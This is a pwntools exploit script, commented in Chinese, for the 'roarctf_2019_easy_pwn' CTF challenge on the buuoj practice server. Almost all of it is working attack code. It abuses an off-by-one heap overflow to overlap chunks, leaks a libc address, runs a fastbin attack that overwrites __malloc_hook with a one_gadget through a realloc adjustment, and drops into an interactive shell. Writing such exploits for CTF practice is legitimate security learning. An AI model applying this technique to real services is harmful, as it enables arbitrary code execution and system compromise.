from pwn import *
from LibcSearcher import LibcSearcher
import sys

io = -1
############################
#********修改文件名**********
############################
file_name = 'roarctf_2019_easy_pwn'
port = 29183

###########修改宏###########
DEBUG = 0
LOG_PRINT = 1
TMUX = 0
def LOG_ADDR_SUCCESS(name:str, addr:int):
    '''
    打印地址
    name: 变量名，str
    addr: 地址，int

    '''
    global LOG_PRINT
    if LOG_PRINT:
        log.success('{} ===> {}'.format(name, hex(addr)))

def LOG_SUCCESS(info):
    '''
    打印信息
    
    '''
    if LOG_PRINT:
        log.success(info)

def Get_Str_Addr(target_addr:str):
    """
    获取字符串的地址

    """
    global io
    return io.search(target_addr.encode()).__next__()

if DEBUG: # 本地打
    io = process('./{}'.format(file_name))
    def STOP(idx:str = 0):
        input('stop{} ===> {}'.format(idx, proc.pidof(io)))
    if TMUX:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(io, gdbscript='b *0x80485FC\nc\n')
else: # 远程打
    io = remote('node3.buuoj.cn', port)

io_elf = ELF('./{}'.format(file_name))
log.success("libc used ===> {}".format(io_elf.libs))
context.log_level = 'debug'

##########################下面为攻击代码#######################
##########################下面为攻击代码#######################
'''
菜单
'''
def create_note(size:int):
    io.sendlineafter(b"choice: ", b'1')
    io.sendlineafter(b"size: ", str(size).encode())
    io.recvuntil(b"the index of ticket is ")
    msg = io.recvuntil(b'\n')
    print("idx msg recv:{}".format(msg))
    return int(msg[:-2].decode())


def write_note(idx:int, size:int, content:bytes=b'a'):
    io.sendlineafter(b"choice: ", b'2')
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendlineafter(b"size: ", str(size).encode())
    io.sendafter(b"content: ", content)
    
def drop_note(idx:int):
    io.sendlineafter(b"choice: ", b'3')
    io.sendlineafter(b"index: ", str(idx).encode())

def show_note(idx:int):
    io.sendlineafter(b"choice: ", b'4')
    io.sendlineafter(b"index: ", str(idx).encode())
    io.recvuntil(b"content: ")
    msg = io.recvuntil(b"Note system\n")
    print("content msg recv:{}".format(msg))
    return msg


idx0 = create_note(0x18)
idx1 = create_note(0x18)
idx2 = create_note(0x80)
idx3 = create_note(0x18)


# 写一个0x71
write_note(idx2, 0x20, p64(0) * 3 + p64(0x71))
# 溢出 写一个0x41
write_note(idx0, 0x18+0xa, 0x18 * b'a' + b'\x41')
# free 1
drop_note(idx1)
# re malloc back
idx4 = create_note(0x30)
# 写个 0x91
write_note(idx4, 0x20, p64(0) * 3 + p64(0x91))
# drop 2
drop_note(idx2)
msg = show_note(idx4)

leak_addr = msg[0x20:0x28]
leak_addr = u64(leak_addr)
LOG_ADDR_SUCCESS('leak_addr', leak_addr)

libc_base = leak_addr - 0x3c4b20 - 0x58
LOG_ADDR_SUCCESS('libc_base', libc_base)

# re malloc 0x80
idx5 = create_note(0x80)
# 写个 0x21
write_note(idx5, 0x70, p64(0) * 13 + p64(0x21))
# 写个0x71
write_note(idx4, 0x20, p64(0) * 3 + p64(0x71))
# free idx5
drop_note(idx5)
target = leak_addr - 0x58 - 0x33 # 在mallo chook上面写（低地址）
# target = leak_addr-0x78+5 # 在malloc hook下面写（高地址）
LOG_ADDR_SUCCESS('target', target)
# 写个taeget = leak_addr - 0x58 - 0x33
# target = leak_addr + 0x1c1d # free hook
write_note(idx4, 0x28, p64(0) * 3 + p64(0x71) + p64(target))
create_note(0x60)
idx6 = create_note(0x60)
one_gadget = [0x45226, 0x4526a, 0xf0364, 0xf1207]
gadget = libc_base + one_gadget[1]
LOG_ADDR_SUCCESS('gadget', gadget)

relloc_addr = libc_base +  0x846c0# 0x84710 #  0x846c0
payload = (0x13 - 8) * b'a' + p64(gadget) + p64(relloc_addr + 0xd)

LOG_ADDR_SUCCESS('leak_addr', leak_addr)

# payload = (0x1b + 8) * b'\x00' + p64(0x71)*3 + p64(leak_addr-0x88 + 0x40)
write_note(idx6, len(payload), payload)
# STOP()

# idx7 = create_note(0x60)

# # STOP()

# fake_top_chunk_addr = leak_addr - 0x68 + 0x1c98 - 0xb58
# payload = b'\x00' * 0x10 + p64(0) *5  + p64(fake_top_chunk_addr)
# write_note(idx7, len(payload), payload)

# # # 恢复
# payload = (0x1b + 8) * b'\x00' + p64(0)
# write_note(idx6, len(payload), payload)

# STOP()

io.sendlineafter(b"choice: ", b'1')
io.sendlineafter(b"size: ", str(16).encode())

# idx8 = create_note(0xb80)


# payload = 0xb48 * b'a'
# write_note(idx8, len(payload), payload)

io.interactive()
